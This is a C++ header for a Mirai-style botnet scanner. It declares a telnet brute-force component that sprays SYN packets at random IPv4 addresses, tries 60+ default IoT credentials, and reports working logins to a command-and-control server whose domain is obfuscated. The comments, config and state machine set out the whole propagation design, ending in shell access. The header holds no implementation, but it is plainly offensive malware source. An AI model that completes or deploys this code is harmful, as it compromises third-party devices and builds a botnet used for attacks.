// scanner.hpp — telnet brute-force scanner for self-propagation.
//
// Architecture mirrors Mirai's scanner.c:
//   1. Raw socket SYN spray at random IPv4 addresses (:23, :2323)
//   2. SYN+ACK → TCP connect → telnet IAC negotiation
//   3. Brute-force with 60+ default IoT credential pairs
//   4. On success → report creds to scan callback server
//   5. Weighted random credential selection
//
// The scanner runs in a dedicated thread spawned by main().
// It reports credentials to the CNC's scan listener (port 48101).

#pragma once

#include <cstdint>
#include <cstddef>
#include <string>
#include <vector>
#include <thread>
#include <atomic>
#include <mutex>

namespace scanner {

// --- credential entry ---
struct AuthEntry {
    std::string username;
    std::string password;
    uint8_t     weight;  // 1-10, higher = tried more often
};

// --- config ---
struct Config {
    uint16_t raw_pps       = 160;    // SYN packets per second
    uint16_t max_conns     = 128;    // max simultaneous brute-force attempts
    uint16_t conn_timeout  = 30;     // seconds before abandoning a connection
    uint8_t  retry_count   = 10;     // credential retries per IP
    uint16_t cnc_port      = 48101;  // scan callback port (reports creds here)
    // The CNC domain is read from the obfuscation table (CNC_DOMAIN).
};

// --- connection state machine ---
enum class State : uint8_t {
    CONNECTING,
    READ_IACS,          // telnet negotiation
    WAITING_USERNAME,   // waiting for "login:" / "Username:" prompt
    WAITING_PASSWORD,   // waiting for "Password:" prompt
    SENDING_COMMANDS,   // sending enable / system / shell / sh
    VERIFYING,          // checking if we got a shell
    DONE,
    FAILED,
};

// --- init & control ---
void init(const Config& cfg = Config{});
void start();           // begin scanning (non-blocking, spawns thread)
void stop();            // signal the scanner to exit
bool is_running();

// --- credentials ---
void add_auth(const char* user, const char* pass, uint8_t weight = 5);
const AuthEntry& random_auth();  // weighted random selection

} // namespace scanner
